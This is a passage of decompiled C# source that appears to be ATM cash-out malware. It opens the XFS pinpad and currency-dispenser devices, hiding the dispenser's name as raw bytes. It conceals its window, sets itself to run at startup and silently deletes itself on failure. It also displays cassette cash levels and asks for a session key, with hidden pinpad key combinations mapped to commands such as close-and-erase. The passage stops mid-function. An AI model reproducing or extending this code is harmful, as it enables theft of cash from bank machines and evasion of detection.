using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using _003CCppImplementationDetails_003E;
using std;

namespace ulssm;

public class Form1 : Form
{
	private delegate void AddControlToTheFormThread(Control item);

	private delegate void RemoveControlFromFormThread(Control item);

	private delegate void PrintCodeThread();

	private delegate void PrintInfoThread(Control item, string text, Color color);

	private Container components;

	public unsafe Form1()
	{
		try
		{
			InitializeComponent();
			_003CModule_003E.smethod_52((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP));
			uint num = 8u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP), &num);
			uint num2 = 8u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP), &num2);
			uint num3 = 8u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP), &num3);
			uint num4 = 8u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP), &num4);
			uint num5 = 8u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP), &num5);
			uint num6 = 8u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP), &num6);
			_003CModule_003E.smethod_52((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_SHOW_APP));
			uint num7 = 2u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_SHOW_APP), &num7);
			uint num8 = 2u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_SHOW_APP), &num8);
			uint num9 = 2u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_SHOW_APP), &num9);
			uint num10 = 2u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_SHOW_APP), &num10);
			uint num11 = 8u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_SHOW_APP), &num11);
			uint num12 = 64u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_SHOW_APP), &num12);
			uint num13 = 512u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_SHOW_APP), &num13);
			uint num14 = 1u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_HIDE_APP), &num14);
			uint num15 = 32u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_EXTEND_TIME), &num15);
			uint num16 = 32u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_EXTEND_TIME), &num16);
			uint num17 = 32u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_EXTEND_TIME), &num17);
			uint num18 = 32u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_EXTEND_TIME), &num18);
			uint num19 = 32u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_EXTEND_TIME), &num19);
			uint num20 = 32u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_EXTEND_TIME), &num20);
			uint num21 = 32u;
			_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_EXTEND_TIME), &num21);
			return;
		}
		catch
		{
			//try-fault
			((Form)this).Dispose(true);
			throw;
		}
	}

	private void method_0()
	{
		((IDisposable)components)?.Dispose();
	}

	private void InitializeComponent()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Expected O, but got Unknown
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a4: Expected O, but got Unknown
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Expected O, but got Unknown
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Expected O, but got Unknown
		//IL_00f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Expected O, but got Unknown
		//IL_0118: Unknown result type (might be due to invalid IL or missing references)
		//IL_0122: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		Globals.myForm = new Form();
		Globals.cassetteNumberLabel = (Label[])(object)new Label[10];
		Globals.cashUnitNominalLabel = (Label[])(object)new Label[10];
		Globals.cashUnitItemsLeftLabel = (Label[])(object)new Label[10];
		Globals.cashUnitTotalLabel = (Label[])(object)new Label[10];
		Globals.infoLabel = (Label[])(object)new Label[5];
		int num = 0;
		do
		{
			Globals.infoLabel[num] = new Label();
			((Control)Globals.infoLabel[num]).set_Font(new Font("COURIER NEW", 15.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
			Globals.infoLabel[num].set_AutoSize(true);
			num++;
		}
		while (num < 5);
		int num2 = 0;
		do
		{
			Globals.cassetteNumberLabel[num2] = new Label();
			Globals.cashUnitNominalLabel[num2] = new Label();
			Globals.cashUnitItemsLeftLabel[num2] = new Label();
			Globals.cashUnitTotalLabel[num2] = new Label();
			((Control)Globals.cassetteNumberLabel[num2]).set_Font(new Font("Lucida Console", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
			((Control)Globals.cashUnitNominalLabel[num2]).set_Font(new Font("Lucida Console", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
			((Control)Globals.cashUnitItemsLeftLabel[num2]).set_Font(new Font("Lucida Console", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
			((Control)Globals.cashUnitTotalLabel[num2]).set_Font(new Font("Lucida Console", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
			Globals.cassetteNumberLabel[num2].set_AutoSize(true);
			Globals.cashUnitItemsLeftLabel[num2].set_AutoSize(true);
			Globals.cashUnitNominalLabel[num2].set_AutoSize(true);
			Globals.cashUnitTotalLabel[num2].set_AutoSize(true);
			num2++;
		}
		while (num2 < 10);
		((Control)this).SuspendLayout();
		Color controlText = SystemColors.ControlText;
		((Form)this).set_BackColor(controlText);
		int systemMetrics = _003CModule_003E.GetSystemMetrics(0);
		int systemMetrics2 = _003CModule_003E.GetSystemMetrics(1);
		if (systemMetrics2 != 0 && systemMetrics != 0)
		{
			Size clientSize = new Size(systemMetrics, systemMetrics2);
			((Form)this).set_ClientSize(clientSize);
		}
		else
		{
			Size clientSize2 = new Size(640, 480);
			((Form)this).set_ClientSize(clientSize2);
		}
		setStaticFormObj();
		Point location = new Point(20, 350);
		((Control)Globals.infoLabel[0]).set_Location(location);
		Color white = Color.White;
		((Control)Globals.infoLabel[0]).set_ForeColor(white);
		Globals.infoLabel[0].set_Text("CODE: ");
		Point location2 = new Point(20, 390);
		((Control)Globals.infoLabel[1]).set_Location(location2);
		Color yellow = Color.Yellow;
		((Control)Globals.infoLabel[1]).set_ForeColor(yellow);
		Globals.infoLabel[1].set_Text("ENTER SESSION KEY TO PROCEED!");
		Point location3 = new Point(20, 330);
		((Control)Globals.infoLabel[2]).set_Location(location3);
		Color yellowGreen = Color.YellowGreen;
		((Control)Globals.infoLabel[2]).set_ForeColor(yellowGreen);
		Globals.infoLabel[2].set_Text("");
		((Control)this).get_Controls().Add((Control)(object)Globals.infoLabel[0]);
		((Control)this).get_Controls().Add((Control)(object)Globals.infoLabel[1]);
		((Control)this).get_Controls().Add((Control)(object)Globals.infoLabel[2]);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		Color lime = Color.Lime;
		((Control)this).set_ForeColor(lime);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("APTRASST");
		((Form)this).add_Shown((EventHandler)Form1_Shown);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
		((Form)this).set_ControlBox(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_TopMost(true);
	}

	private unsafe static int prepareXFSManagerAndOpenServiceProviders()
	{
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct68 @struct);
		*(sbyte*)(&@struct) = 67;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 1)) = 117;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 2)) = 114;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 3)) = 114;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 4)) = 101;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 5)) = 110;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 6)) = 99;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 7)) = 121;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 8)) = 68;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 9)) = 105;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 10)) = 115;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 11)) = 112;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 12)) = 101;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 13)) = 110;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 14)) = 115;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 15)) = 101;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 16)) = 114;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 17)) = 49;
		System.Runtime.CompilerServices.Unsafe.As<Struct68, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 18)) = 0;
		// IL initblk instruction
		System.Runtime.CompilerServices.Unsafe.InitBlock(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 19), 0, 11);
		int num = executeStartUp();
		_003CModule_003E.smethod_95(_003CModule_003E.smethod_121((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), num), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY01_0024_0024CBD_0));
		if (num == 0)
		{
			int num2 = (int)_003CModule_003E.ppInt_2;
			_003CModule_003E.smethod_117(_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY03_0024_0024CBD_0)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
			_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct17_1));
			_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY05_0024_0024CBD_0));
			int num3 = executeOpen((sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY08_0024_0024CBD_0), (ushort*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.pinpadHS));
			if (num3 == 0)
			{
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY03_0024_0024CBD_0)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				int num4 = executeOpen((sbyte*)(&@struct), (ushort*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.cdmHS));
				if (num4 == 0)
				{
					_003CModule_003E.smethod_117(_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY03_0024_0024CBD_0)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
					_003CModule_003E.smethod_117(_003CModule_003E.smethod_117(_003CModule_003E.smethod_95(_003CModule_003E.smethod_117(_003CModule_003E.smethod_117((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct19_0)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
					uint num5 = 0u;
					System.Runtime.CompilerServices.Unsafe.SkipInit(out _wfs_result* ptr);
					int num6 = _003CModule_003E.WFSGetInfo(_003CModule_003E.pinpadHS, 405u, &num5, 0u, &ptr);
					if (num6 == 0)
					{
						_003CModule_003E.smethod_117(_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY03_0024_0024CBD_0)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
						_wfs_pin_func_key_detail* ptr2 = (_wfs_pin_func_key_detail*)(int)System.Runtime.CompilerServices.Unsafe.ReadUnaligned<uint>((byte*)ptr + 30);
						_003CModule_003E.smethod_117(_003CModule_003E.smethod_122(uint_1: _003CModule_003E.keyFuncMask = System.Runtime.CompilerServices.Unsafe.ReadUnaligned<uint>(ptr2), pStruct54_0: _003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct20_0))), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
						_003CModule_003E.printf((sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct20_1), __arglist(System.Runtime.CompilerServices.Unsafe.ReadUnaligned<uint>(ptr2)));
						_003CModule_003E.smethod_117(_003CModule_003E.smethod_118(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct0_0)), ushort.MaxValue), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
						_003CModule_003E.WFSFreeResult(ptr);
					}
					else
					{
						_003CModule_003E.smethod_117(_003CModule_003E.smethod_121(_003CModule_003E.smethod_95(_003CModule_003E.smethod_117((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct21_0)), num6), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
						_003CModule_003E.WFSFreeResult(ptr);
						_003CModule_003E.WFSClose(ushort.MaxValue);
						_003CModule_003E.WFSCleanUp();
					}
					return num6;
				}
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_121(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct18_0)), num4), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				_003CModule_003E.WFSClose(ushort.MaxValue);
				_003CModule_003E.WFSCleanUp();
				return num4;
			}
			_003CModule_003E.smethod_117(_003CModule_003E.smethod_121(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct18_0)), num3), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
			_003CModule_003E.WFSClose(ushort.MaxValue);
			_003CModule_003E.WFSCleanUp();
			return num3;
		}
		_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct17_0)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)_003CModule_003E.ppInt_2);
		return num;
	}

	[return: MarshalAs(UnmanagedType.U1)]
	private unsafe static bool isPINPadBusy(ushort hs)
	{
		if (_003CModule_003E.WFSIsBlocking() != 0)
		{
			_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct22_0));
		}
		else
		{
			_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct14_0));
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _wfs_result* ptr);
		int num = _003CModule_003E.WFSGetInfo(_003CModule_003E.pinpadHS, 401u, null, 0u, &ptr);
		switch (num)
		{
		case 0:
			if (System.Runtime.CompilerServices.Unsafe.ReadUnaligned<ushort>((void*)System.Runtime.CompilerServices.Unsafe.ReadUnaligned<int>((byte*)ptr + 30)) == 6)
			{
				_003CModule_003E.smethod_95(_003CModule_003E.smethod_117((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)_003CModule_003E.ppInt_2), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct23_0));
				return true;
			}
			_003CModule_003E.smethod_95(_003CModule_003E.smethod_117((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)_003CModule_003E.ppInt_2), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct24_0));
			return false;
		case -41:
			_003CModule_003E.smethod_95(_003CModule_003E.smethod_117((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)_003CModule_003E.ppInt_2), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct25_0));
			return false;
		default:
		{
			int num2 = (int)_003CModule_003E.ppInt_2;
			_003CModule_003E.smethod_117(_003CModule_003E.smethod_121(_003CModule_003E.smethod_95(_003CModule_003E.smethod_117((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct26_0)), num), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
			return true;
		}
		}
	}

	private unsafe void Form1_Shown(object sender, EventArgs e)
	{
		_003CModule_003E.winHWND = _003CModule_003E.GetActiveWindow();
		GetNeededFolderPath(37, (char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.SYS));
		GetNeededFolderPath(24, (char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.STARTUP));
		_003CModule_003E.ShowWindow(_003CModule_003E.winHWND, 0);
		_003CModule_003E.FIRST_START = checkAppForFirstLaunch();
		if (setAutoStartUpRegistry())
		{
			_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct27_0));
		}
		else
		{
			_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct28_0));
		}
		if (prepareXFSManagerAndOpenServiceProviders() != 0)
		{
			silentDeleteFile((char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct34_1));
			_003CModule_003E.exit(0);
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out uint num);
		_003CModule_003E._beginthreadex((void*)null, 0u, (delegate*<void*, uint>)(&TimeInterval), (void*)null, 0u, &num);
		_003CModule_003E._beginthreadex((void*)null, 0u, (delegate*<void*, uint>)(&MainLoop), (void*)null, 0u, (uint*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MAIN_LOOP_THREADID));
	}

	private unsafe static int executeOpen(sbyte* deviceLogicalName, ushort* hService)
	{
		sbyte* ptr = deviceLogicalName;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct68 @struct);
		sbyte* ptr2 = (sbyte*)(&@struct);
		sbyte b;
		do
		{
			b = (*ptr2 = *ptr);
			ptr++;
			ptr2++;
		}
		while (b != 0);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _wfsversion wfsversion);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _wfsversion wfsversion2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num);
		int result = _003CModule_003E.WFSOpen(deviceLogicalName, null, null, 0u, 0u, 167838617u, &wfsversion, &wfsversion2, &num);
		*hService = num;
		_003CModule_003E.smethod_95(_003CModule_003E.smethod_95(_003CModule_003E.smethod_95(_003CModule_003E.smethod_95(_003CModule_003E.smethod_95(_003CModule_003E.smethod_118(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct28_1)), num), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct27_2)), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfsversion, 6))), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct27_1)), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfsversion2, 6))), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY01_0024_0024CBD_0));
		return result;
	}

	private unsafe static int executeStartUp()
	{
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _wfsversion wfsversion);
		int result = _003CModule_003E.WFSStartUp(167838617u, &wfsversion);
		_003CModule_003E.smethod_95(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct8_0)), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfsversion, 6)));
		return result;
	}

	private static void ClearAllCassettesInfo()
	{
		int num = 0;
		do
		{
			if (((Control)Globals.myForm).get_Controls().Contains((Control)(object)Globals.cassetteNumberLabel[num]))
			{
				RemoveControlFromForm((Control)(object)Globals.cassetteNumberLabel[num]);
			}
			if (((Control)Globals.myForm).get_Controls().Contains((Control)(object)Globals.cashUnitNominalLabel[num]))
			{
				RemoveControlFromForm((Control)(object)Globals.cashUnitNominalLabel[num]);
			}
			if (((Control)Globals.myForm).get_Controls().Contains((Control)(object)Globals.cashUnitItemsLeftLabel[num]))
			{
				RemoveControlFromForm((Control)(object)Globals.cashUnitItemsLeftLabel[num]);
			}
			if (((Control)Globals.myForm).get_Controls().Contains((Control)(object)Globals.cashUnitTotalLabel[num]))
			{
				RemoveControlFromForm((Control)(object)Globals.cashUnitTotalLabel[num]);
			}
			num++;
		}
		while (num < 10);
	}

	private unsafe static void DrawCasseteInfo(int cassetteNr, int STATUS, uint* data, sbyte* currency)
	{
		int num = cassetteNr - 1;
		int num2 = cassetteNr % 2;
		int num3 = ((num2 == 0) ? 1 : 0);
		int num4 = ((num2 == 0) ? (cassetteNr / 2 - 1) : ((cassetteNr + 1) / 2 - 1));
		if (((Control)Globals.myForm).get_Controls().Contains((Control)(object)Globals.cassetteNumberLabel[num]))
		{
			RemoveControlFromForm((Control)(object)Globals.cassetteNumberLabel[num]);
		}
		if (((Control)Globals.myForm).get_Controls().Contains((Control)(object)Globals.cashUnitNominalLabel[num]))
		{
			RemoveControlFromForm((Control)(object)Globals.cashUnitNominalLabel[num]);
		}
		if (((Control)Globals.myForm).get_Controls().Contains((Control)(object)Globals.cashUnitItemsLeftLabel[num]))
		{
